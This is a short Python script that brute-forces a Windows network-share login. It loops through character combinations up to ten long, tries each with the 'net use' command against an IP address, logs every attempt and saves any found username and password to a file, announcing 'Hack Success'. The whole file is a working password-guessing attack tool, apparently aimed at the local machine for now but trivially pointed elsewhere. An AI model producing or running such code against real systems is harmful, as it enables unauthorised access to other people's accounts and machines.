import itertools
import subprocess
import socket

hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)
Characters = "012"
#Characters = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
user = input("What is your user : ")
ip = ip_address
file_path = "MdpMemoire.txt"
finished_path = "MdpFini.txt"

def load_previous_attempts(file_path):
    try:
        with open(file_path, 'r') as file:
            return set(file.read().splitlines())
    except FileNotFoundError:
        return set()

def save_attempt(guess, file_path):
    with open(file_path, 'a') as file:
        file.write(guess + '\n')

def save_successful_attempt(user, password, finished_path):
    with open(finished_path, 'a') as file:
        file.write(f"{user}|||{password}\n")

def brute_force(chars, length, previous_attempts):
    attempts = 0
    for attempt in itertools.product(chars, repeat=length):
        guess = ''.join(attempt)
        if guess in previous_attempts:
            continue
        print(f"Trying: {guess}")
        save_attempt(guess, file_path)
        attempts += 1
        result = subprocess.run(
            ["net", "use", f"\\\\{ip}", f"/user:{user}", guess],
            capture_output=True,
            text=True
        )
        if result.returncode == 0:
            print(f"Password found: {guess}")
            save_successful_attempt(user, guess, finished_path)
            bb = input("Hack Success ... ")
            print(bb)
            return True
    return False

def main():
    print("Starting brute-force...")
    previous_attempts = load_previous_attempts(file_path)
    for length in range(1, 11):  # Vary the length from 1 to 10
        if brute_force(Characters, length, previous_attempts):
            break

if __name__ == "__main__":
    main()